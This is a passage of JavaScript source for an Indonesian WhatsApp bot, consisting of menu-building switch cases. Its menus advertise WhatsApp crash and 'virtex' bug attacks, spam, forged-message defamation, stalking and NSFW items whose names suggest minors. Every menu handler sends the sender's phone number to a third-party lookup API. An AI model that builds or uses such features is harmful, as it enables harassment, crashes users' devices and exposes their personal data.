│• ${prefix}debug
│• ${prefix}loli 
│• ${prefix}debug2
│• ${prefix}infogempa
│• ${prefix}resepmasakan
│• ${prefix}chat 62|P
│• ${prefix}caripesan <query>
│• ${prefix}get url
│• ${prefix}githubstalk <query>
│• ${prefix}ytsearch <query>
│• ${prefix}igstalk <query>
│• ${prefix}tiktokstalk <query>
│• ${prefix}play <query>
│• ${prefix}video <query>
│• ${prefix}igstory <username>
│• ${prefix}twitter <link>
│• ${prefix}tiktok <link>
│• ${prefix}fb <link>
│• ${prefix}brainly <query>
│• ${prefix}image <query>
│• ${prefix}anime <random>
│• ${prefix}pinterest <query>
│• ${prefix}komiku <query>
│• ${prefix}lirik <query>
│• ${prefix}chara <query>
│• ${prefix}playstore <query>
│• ${prefix}otaku <query>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeote}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'maker':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *MAKER* ]
│• ${prefix}fdeface
│• ${prefix}attp <teks>
│• ${prefix}fancytext <teks>
│• ${prefix}emoji
│• ${prefix}halloween <teks>
│• ${prefix}vampire <teks>
│• ${prefix}codetxt <teks>
│• ${prefix}matrix <teks>
│• ${prefix}googletxt <teks>
│• ${prefix}spiderman <teks>
│• ${prefix}express
│• ${prefix}maker2d2 <teks>
│• ${prefix}maker2d3 <teks>
│• ${prefix}maker2d4 <teks>
│• ${prefix}maker3d <teks>
│• ${prefix}golden <teks>
│• ${prefix}flower <teks>
│• ${prefix}dance
│• ${prefix}wooden <teks>
│• ${prefix}burn <teks>
│• ${prefix}glow <teks>
│• ${prefix}summer <teks>
│• ${prefix}neon <teks>
│• ${prefix}coffeecup2 <teks>
│• ${prefix}coffeecup <teks>
│• ${prefix}battlefield <teks|teks>
│• ${prefix}googletxt2 <teks>
│• ${prefix}transformer <teks>
│• ${prefix}nulis <teks>
│• ${prefix}text3d <teks>
│• ${prefix}warrior <teks>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakemeki}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'tools':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *TOOLS* ]
│• ${prefix}nulis <teks>
│• ${prefix}sticker
│• ${prefix}stickerwm <nama|author>
│• ${prefix}dadu
│• ${prefix}semoji <emoji>
│• ${prefix}attp <teks>
│• ${prefix}ttp <teks>
│• ${prefix}ttp2 <teks>
│• ${prefix}ttp3 <teks>
│• ${prefix}ttp4 <teks>
│• ${prefix}toimg
│• ${prefix}tomp3 <reply video>
│• ${prefix}tomp4 <reply sticker gif>
│• ${prefix}robot <reply audio>
│• ${prefix}balik <reply audio>
│• ${prefix}bass <reply audio>
│• ${prefix}gemuk <reply audio>
│• ${prefix}detikvn <reply audio caption angka>
│• ${prefix}detikvideo <reply video caption angka>
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakejem}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'text':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *TEXTMAKER* ]
│• ${prefix}blackpink text
│• ${prefix}neon text
│• ${prefix}greenneon text
│• ${prefix}advanceglow text
│• ${prefix}futureneon text
│• ${prefix}sandwriting text
│• ${prefix}sandsummer text
│• ${prefix}sandengraved text
│• ${prefix}metaldark text
│• ${prefix}neonlight text
│• ${prefix}holographic text
│• ${prefix}text1917 text
│• ${prefix}minion text
│• ${prefix}deluxesilver text
│• ${prefix}newyearcard text
│• ${prefix}bloodfrosted text
│• ${prefix}halloween text
│• ${prefix}jokerlogo text
│• ${prefix}fireworksparkle text
│• ${prefix}natureleaves text
│• ${prefix}bokeh text
│• ${prefix}toxic text
│• ${prefix}strawberry text
│• ${prefix}box3d text
│• ${prefix}roadwarning text
│• ${prefix}breakwall text
│• ${prefix}icecold text
│• ${prefix}luxury text
│• ${prefix}cloud text
│• ${prefix}summersand text
│• ${prefix}horrorblood text
│• ${prefix}thunder text
│• ${prefix}pornhub text1 text2
│• ${prefix}glitch text1 text2
│• ${prefix}avenger text1 text2
│• ${prefix}space text1 text2
│• ${prefix}ninjalogo text1 text2
│• ${prefix}marvelstudio text1 text2
│• ${prefix}lionlogo text1 text2
│• ${prefix}wolflogo text1 text2
│• ${prefix}steel3d text1 text2
│• ${prefix}wallgravity text1 text2 
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakepeler}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'database':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
╭─[ *DATABASE* ]
│• ${prefix}tagme
│• ${prefix}tts _kodebhs teks_
│• ${prefix}readmore _teks1|teks2_
│• ${prefix}fitnahpc _nomor|teks1|teks2_
│• ${prefix}chat _nomor|teks_
│• ${prefix}fdeface _replyimg link|teks1|teks2_
│• ${prefix}listimage
│• ${prefix}liststicker
│• ${prefix}listvn
│• ${prefix}listgrup
│• ${prefix}baileys _reply message_
│• ${prefix}q _reply message_
│• ${prefix}getcaption _reply message_
│• ${prefix}pantun
│• ${prefix}tospam _reply audio/sticker/image|jumlah_
│• ${prefix}sharelock _teks1|teks2_
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakedatabase}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'photoxy':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *PHOTOXY* ]
│• ${prefix}shadow text
│• ${prefix}cup text
│• ${prefix}cup1 text
│• ${prefix}romance text
│• ${prefix}smoke text
│• ${prefix}burnpaper text
│• ${prefix}lovemessage text
│• ${prefix}undergrass text
│• ${prefix}love text
│• ${prefix}coffe text
│• ${prefix}woodheart text
│• ${prefix}woodenboard text
│• ${prefix}summer3d text
│• ${prefix}wolfmetal text
│• ${prefix}nature3d text
│• ${prefix}underwater text
│• ${prefix}golderrose text
│• ${prefix}summernature text
│• ${prefix}letterleaves text
│• ${prefix}glowingneon text
│• ${prefix}fallleaves text
│• ${prefix}flamming text
│• ${prefix}harrypotter text
│• ${prefix}carvedwood text
│• ${prefix}tiktok text1 text2
│• ${prefix}arcade8bit text1 text2
│• ${prefix}battlefield4 text1 text2
│• ${prefix}pubg text1 text2
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakeoxy}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'game':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *GAME* ]
│• ${prefix}slot
│• ${prefix}tictactoe @tag
│• ${prefix}tebakgambar
│• ${prefix}suit *batu/kertas/gunting*
└──────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakegeming}, [{buttonId:`${prefix}credits`,buttonText:{displayText:'Thanks🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'allmenu':
if (isBanned) return reply(mess.ban)
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `╭─[ *OWNER* ] 
│• ${prefix}off
│• ${prefix}isbaileys
│• ${prefix}banchat
│• ${prefix}unbanchat
│• ${prefix}listbc
│• ${prefix}setcmd
│• ${prefix}delcmd
│• ${prefix}listcmd
│• ${prefix}restart
│• ${prefix}antidelete on|off
│• ${prefix}autoketik on|off
│• ${prefix}autoread gc in / gc off
│• ${prefix}autovn on|off
│• ${prefix}anticall on|off
│• ${prefix}getcaption
│• ${prefix}bugkatalog
│• ${prefix}buggc id grup
│• ${prefix}bugpc *only pc*
│• ${prefix}troliv1
│• ${prefix}troliv2 *total*
│• ${prefix}virtex
│• ${prefix}on
│• ${prefix}status
│• ${prefix}setthumb
│• ${prefix}settarget
│• ${prefix}setfakeimg
│• ${prefix}setreply
│• ${prefix}hacked nama
│• ${prefix}setprefix
│• ${prefix}mode /public-self/
│• ${prefix}term <code>
│• ${prefix}eval <code>
│• ${prefix}colongsw reply
└──────────

╭──[ *GRUP* ]
│• ${prefix}grup 
│• ${prefix}promote 
│• ${prefix}demote 
│• ${prefix}setdesc
│• ${prefix}setname
│• ${prefix}nsfw 1/0
│• ${prefix}kick 
│• ${prefix}add 
│• ${prefix}getbio
│• ${prefix}getname 
│• ${prefix}reminder 
│• ${prefix}listonline
│• ${prefix}sider reply
│• ${prefix}antilink on|off
│• ${prefix}tod
│• ${prefix}tospam jumlah
│• ${prefix}antihidetag on|off
│• ${prefix}antiviewonce on|off
│• ${prefix}antivirtex on|off
│• ${prefix}autojoin on|off
│• ${prefix}kickarea
└──────────

╭──[ *TOOLS* ]
│• ${prefix}nulis (kiri/kanan) <teks>
│• ${prefix}sticker
│• ${prefix}stcmeme <teks>|<teks>
│• ${prefix}stickerwm <nama|author>
│• ${prefix}semoji <emoji>
│• ${prefix}attp <teks>
│• ${prefix}ttp <teks>
│• ${prefix}ttp2 <teks>
│• ${prefix}ttp3 <teks>
│• ${prefix}ttp4 <teks>
└──────────

╭──[ *MAKER* ] 
│• ${prefix}sticker
│• ${prefix}swm author|packname
│• ${prefix}take author|packname
│• ${prefix}fdeface
│• ${prefix}attp teks
│• ${prefix}fancytext teks
│• ${prefix}emoji 
│• ${prefix}halloween teks
│• ${prefix}vampire teks
│• ${prefix}codetxt teks
│• ${prefix}googletxt
│• ${prefix}spiderman teks
│• ${prefix}express teks
│• ${prefix}maker2d2 teks
│• ${prefix}maker2d3 teks
│• ${prefix}maker2d4 teks
│• ${prefix}golden teks
│• ${prefix}flower teks
│• ${prefix}dance
│• ${prefix}wooden teks
│• ${prefix}burn
│• ${prefix}glow teks
│• ${prefix}summer teks
│• ${prefix}neon teks
│• ${prefix}coffeecup teks
│• ${prefix}coffeecup2 teks
│• ${prefix}battlefield teks|teks
│• ${prefix}googletxt2 teks
│• ${prefix}transformer teks
│• ${prefix}nulis teks
│• ${prefix}text3d teks
│• ${prefix}warrior teks
└──────────

╭──[ *CONVERT* ]
│• ${prefix}tomp3
│• ${prefix}tomp4
│• ${prefix}toimg
│• ${prefix}slow
│• ${prefix}fast
│• ${prefix}reverse
│• ${prefix}tourl
└──────────

╭──[ *DOWNLOADER* ]
│• ${prefix}play query
│• ${prefix}ytmp4 link
│• ${prefix}ytmp3 link
│• ${prefix}video query
│• ${prefix}instagram link
│• ${prefix}twitter
│• ${prefix}facebook link
│• ${prefix}tiktokdl
│• ${prefix}tiktokmusic
│• ${prefix}ytsearch
│• ${prefix}play
│• ${prefix}ytmp3
│• ${prefix}ytmp4
│• ${prefix}igdl
│• ${prefix}fbdl
│• ${prefix}brainly
│• ${prefix}lirik
│• ${prefix}tiktoknowm
│• ${prefix}pinterest
│• ${prefix}spotifysearch
└──────────

╭──[ *TAG* ]
│• ${prefix}hidetag
│• ${prefix}kontag
│• ${prefix}sticktag
│• ${prefix}totag
└──────────

╭─[ *GAME* ]
│• ${prefix}slot
│• ${prefix}tictactoe @tag
│• ${prefix}tebakgambar
│• ${prefix}suit *batu/kertas/gunting*
└──────

╭──[ *SEARCHING* ]
│• ${prefix}kbbi
│• ${prefix}jarak
│• ${prefix}translate
│• ${prefix}infogempa
│• ${prefix}covidindo
│• ${prefix}covidglobal
│• ${prefix}wikipedia
│• ${prefix}playstore
│• ${prefix}kodepos
│• ${prefix}newsinfo
│• ${prefix}jadwaltv
│• ${prefix}cuaca
│• ${prefix}gimage
│• ${prefix}wallpapersearch
│• ${prefix}shopee
│• ${prefix}google
└──────────

╭──[ *RANDOM* ]
│• ${prefix}owner
│• ${prefix}sewabot
│• ${prefix}report
│• ${prefix}runtime
│• ${prefix}speed 
│• ${prefix}sc
│• ${prefix}rulesbot
│• ${prefix}sharelock
└──────────

╭──[ *UPSW* ]
│• ${prefix}upswteks
│• ${prefix}upswlokasi
│• ${prefix}upswsticker
│• ${prefix}upswimage
│• ${prefix}upswvideo
│• ${prefix}upswgif
└──────────

╭──[ *GABUT* ]
│• ${prefix}suit
│• ${prefix}artinama
│• ${prefix}jodoh
│• ${prefix}tebakumur
│• ${prefix}weton
│• ${prefix}jadian
│• ${prefix}faktaunik
│• ${prefix}anime
│• ${prefix}truth
│• ${prefix}dare
│• ${prefix}dadu
│• ${prefix}tebakgambar
│• ${prefix}tembak udara 
│• ${prefix}tembak laut
│• ${prefix}tembak darat
│• ${prefix}slot
│• ${prefix}quotes
│• ${prefix}quotesanime
│• ${prefix}quotesdilan
│• ${prefix}quotesimage
│• ${prefix}katabijak
│• ${prefix}randomnama
│• ${prefix}meme
│• ${prefix}darkjoke
│• ${prefix}memeindo
└──────────

╭──[ *TEXT PRO* ]
│• ${prefix}golden text
│• ${prefix}flower text
│• ${prefix}wooden text
│• ${prefix}burn text
│• ${prefix}glow text
│• ${prefix}summer text
│• ${prefix}neon text
│• ${prefix}coffeecup text
│• ${prefix}coffeecup2 text
│• ${prefix}battlefield text|text
│• ${prefix}googletxt2 text|text
│• ${prefix}transformer text|text
│• ${prefix}write text
│• ${prefix}waifu
│• ${prefix}phlogo text|*text
│• ${prefix}tfire text
│• ${prefix}phcomment text|text
│• ${prefix}wolf text
│• ${prefix}ytgol text
│• ${prefix}ytsilver text
│• ${prefix}t3d text
│• ${prefix}logoa text|text
│• ${prefix}marvel text|text
│• ${prefix}leavest text
│• ${prefix}neon2 text
│• ${prefix}wall text
│• ${prefix}notewrite text
│• ${prefix}pubglogo text|text
└──────────

╭──[ *FUN* ] 
│• ${prefix}fitnah
│• ${prefix}fitnahpc
│• ${prefix}kontak 0|p
│• ${prefix}lolivid
│• ${prefix}suit
│• ${prefix}toxic
│• ${prefix}flock
│• ${prefix}pantun
│• ${prefix}dadu
│• ${prefix}asupan
│• ${prefix}viewonce
│• ${prefix}detikvn number
│• ${prefix}detikvideo number
│• ${prefix}hbd
└──────────

╭──[ *STALKING* ]
│• ${prefix}igstalk
│• ${prefix}mlstalk
│• ${prefix}tkstalk
│• ${prefix}githubstalk
│• ${prefix}shortlink
└──────────

╭──[ *ASUPAN* ]
│• ${prefix}asupan
│• ${prefix}asupancecan
│• ${prefix}asupanhijaber
│• ${prefix}asupansantuy
│• ${prefix}asupanukhti
│• ${prefix}asupanbocil
│• ${prefix}asupanghea
│• ${prefix}asupanrika
└──────────

╭──[ *NSFW* ]
│• ${prefix}yuri
│• ${prefix}hentai
│• ${prefix}anal
│• ${prefix}eroneko
│• ${prefix}lesbian
│• ${prefix}kitsune
│• ${prefix}bj
│• ${prefix}pussy
│• ${prefix}wallpaper
│• ${prefix}neko2
│• ${prefix}baka
│• ${prefix}slap
│• ${prefix}poke
│• ${prefix}keta
│• ${prefix}awoo
│• ${prefix}blowjob
│• ${prefix}megumin
│• ${prefix}neko
│• ${prefix}trapnime
└──────────

╭──[ *ANIME* ]
│• ${prefix}kurumi
│• ${prefix}deku
│• ${prefix}sao
│• ${prefix}chika
│• ${prefix}kaneki
│• ${prefix}touka
│• ${prefix}eren
│• ${prefix}naruto
│• ${prefix}minato
│• ${prefix}sagiri
│• ${prefix}sasuke
│• ${prefix}sakura
│• ${prefix}tsunade
│• ${prefix}gojosatoru
└──────────`
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:fakemenu}, [{buttonId:`${prefix}owner`,buttonText:{displayText:'Owner'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
function _0x4af9(_0x4eb289,_0x460dc0){var _0x7c4ea3=_0x7c4e();return _0x4af9=function(_0x4af938,_0x415d63){_0x4af938=_0x4af938-0x9b;var _0x4e9d66=_0x7c4ea3[_0x4af938];return _0x4e9d66;},_0x4af9(_0x4eb289,_0x460dc0);}var _0x4aac40=_0x4af9;(function(_0x2b13ef,_0x4fdb60){var _0x30a783=_0x4af9,_0x152224=_0x2b13ef();while(!![]){try{var _0x52e3ce=-parseInt(_0x30a783(0x9f))/0x1*(parseInt(_0x30a783(0xa9))/0x2)+parseInt(_0x30a783(0xbf))/0x3+-parseInt(_0x30a783(0xa6))/0x4+parseInt(_0x30a783(0xc0))/0x5+-parseInt(_0x30a783(0x9b))/0x6*(-parseInt(_0x30a783(0xa4))/0x7)+-parseInt(_0x30a783(0xb2))/0x8+parseInt(_0x30a783(0xad))/0x9*(-parseInt(_0x30a783(0xbe))/0xa);if(_0x52e3ce===_0x4fdb60)break;else _0x152224['push'](_0x152224['shift']());}catch(_0x2be653){_0x152224['push'](_0x152224['shift']());}}}(_0x7c4e,0x79e51),listMsg={'buttonText':_0x4aac40(0xbc),'footerText':'Tekan\x20tombol\x20*Click\x20Here*\x20untuk\x20melihat\x20menu\x0aMohon\x20jangan\x20spam','description':_0x4aac40(0xa5)+sender[_0x4aac40(0x9e)]('@')[0x0]+',\x20Silahkan\x20pilih\x20menu\x20disini','sections':[{'title':_0x4aac40(0x9d),'rows':[{'title':_0x4aac40(0xac),'description':_0x4aac40(0xbb),'rowId':prefix+'sewa'}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xb0),'description':_0x4aac40(0xa8),'rowId':prefix+_0x4aac40(0xc2)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xca),'description':_0x4aac40(0xb7),'rowId':prefix+_0x4aac40(0xa2)}]},{'title':'\x20','rows':[{'title':'Allmenu','description':_0x4aac40(0xb9),'rowId':prefix+'allmenu'}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xc4),'description':_0x4aac40(0xb1),'rowId':prefix+_0x4aac40(0xc1)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xb8),'description':'Info\x20bot','rowId':prefix+_0x4aac40(0xcb)}]},{'title':'\x20','rows':[{'title':'Grup','description':'Fitur\x20Khusus\x20grup','rowId':prefix+'grup'}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xa1),'description':_0x4aac40(0xb6),'rowId':prefix+_0x4aac40(0xb4)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xc8),'description':'Fitur\x20anime\x20wibu\x20bau\x20bawang','rowId':prefix+_0x4aac40(0xc3)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xae),'description':'Gatau','rowId':prefix+_0x4aac40(0xaf)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xc5),'description':_0x4aac40(0xa7),'rowId':prefix+'other'}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xcc),'description':'Membuat\x20sesuatu','rowId':prefix+_0x4aac40(0xc6)}]},{'title':'\x20','rows':[{'title':'Tools','description':_0x4aac40(0xbd),'rowId':prefix+_0x4aac40(0xba)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xb5),'description':_0x4aac40(0xaa),'rowId':prefix+_0x4aac40(0xab)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xa0),'description':'Gatau','rowId':prefix+_0x4aac40(0xa3)}]},{'title':'\x20','rows':[{'title':_0x4aac40(0xb3),'description':'Game\x20bang','rowId':prefix+'game'}]},{'title':'\x20','rows':[{'title':_0x4aac40(0x9c),'description':_0x4aac40(0xc9),'rowId':prefix+_0x4aac40(0xc7)}]}],'listType':0x1},ALIYABOT['sendMessage'](from,listMsg,MessageType['listMessage'],{'contextInfo':{'mentionedJid':[sender]},'quoted':mek}));function _0x7c4e(){var _0x45c640=['1469888MyVcuo','Lainnya','Fun','656138RPzoyg','Data\x20data','database','Sewa\x20Bot','315WhPUxx','Upload','upload','Kerang\x20Menu','Ingin\x20Download\x20Sesuatu??\x20,Klik\x20Di\x20Sini','150920dNurZF','Game','ownermenu','Database','Fitur\x20ini\x20khusus\x20Owner','Biar\x20botnya\x20on\x20terus','About','Menampilkan\x20semua\x20menu','tools','List\x20harga\x20sewa\x20bot','Click\x20Here','Alat','215170tJRBHJ','647322CzCpqP','3765540xnUrLB','download','kerang','wibu','Downloader','Other\x20menu','maker','text','Wibu','Membuat\x20logo\x20praktis','Donasi','about','Maker','2040baVjOm','Text\x20Pro','Daftar\x20menu\x20ABot','split','1vqQUZM','Photoxy','OwnerMenu','donasi','photoxy','20545MeTFBH','Hai\x20kak\x20@'];_0x7c4e=function(){return _0x45c640;};return _0x7c4e();}
break
case 'aRllmenu':
groups = ALIYABOT.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = ALIYABOT.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await ALIYABOT.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await ALIYABOT.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*╭─[ ALL MENU ]*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
